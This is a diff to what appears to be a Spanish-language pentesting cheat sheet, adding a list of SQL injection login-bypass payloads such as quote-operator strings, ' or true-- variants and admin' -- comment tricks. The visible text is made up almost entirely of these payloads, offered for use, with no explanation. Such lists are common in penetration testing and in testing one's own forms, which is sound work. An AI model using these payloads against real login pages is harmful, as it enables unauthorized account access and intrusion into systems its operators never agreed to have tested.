@@ -392,10 +392,37 @@ Muchos mas:
 ## Payloads para sql inyection login bypass
 
 ```
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+
 ' or ''-'
 " or ""-"
 " or true--
 ' or true--
+
 admin' --
 admin' #
 admin'/*
